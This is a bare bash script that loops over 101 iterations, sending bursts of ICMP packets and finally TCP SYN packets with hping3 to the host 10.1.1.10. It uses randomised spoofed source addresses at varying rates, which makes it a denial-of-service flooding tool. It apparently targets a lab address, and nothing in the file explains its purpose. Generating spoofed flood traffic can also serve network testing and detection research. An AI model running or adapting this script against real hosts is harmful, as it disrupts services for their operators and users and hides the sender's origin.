#!/bin/bash
for i in {200..300}
do
   ping -c1 10.1.1.10
   hping3 -1 --rand-source -i u10000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u15000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u20000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u25000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u30000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u35000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u40000  -c 1000 10.1.1.10
   hping3 -1 --rand-source -i u45000  -c 500 10.1.1.10
   hping3 -1 --rand-source -i u50000  -c 500 10.1.1.10
   hping3  --rand-source  -S -i u50000  -c 500 10.1.1.10

done
